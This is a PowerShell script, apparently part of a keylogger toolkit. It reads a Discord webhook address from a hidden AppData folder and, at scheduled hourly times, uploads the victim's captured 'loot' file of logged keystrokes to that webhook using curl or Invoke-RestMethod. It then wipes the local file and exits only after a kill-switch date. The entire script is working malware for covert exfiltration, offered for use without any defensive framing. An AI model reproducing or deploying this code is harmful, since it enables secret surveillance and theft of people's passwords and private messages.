# powershell log scheduler
# created by  : C0SM0
# Modified by : Jakoby

$Path="$env:appdata\-locker\$env:UserName-loot.txt"

$dc = (Get-Content "$env:appdata\-locker\wh.txt" -TotalCount 1)

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)


$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $dc}
}

if([String]::IsNullOrWhiteSpace((Get-content "$env:appdata\-locker\log.txt"))){
# times logs will be sent [keep in military time]
$logTimes = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00'
)
}

else {$logTimes = @(
    (Get-content "$env:appdata\-locker\log.txt")
)
}    

# sort the times in chronological order
$logTimes = $logTimes | Sort-Object

# ensure keylogger runs every day
while ($true) {

    # run keylogger for each trigger time
    foreach ($t in $logTimes)
    {
        # checks if time passed already
        if((Get-Date) -lt (Get-Date -Date $t))
        {
            # sleeps until next time is reached
            while ((Get-Date -Date $t) -gt (Get-Date))
            {
              # sleeps
	      if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")){exit}
              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
            }
  
            # runs keylogger
	    Upload-Discord -file $Path
            echo "" > $Path 
            
			
        }
    }
}
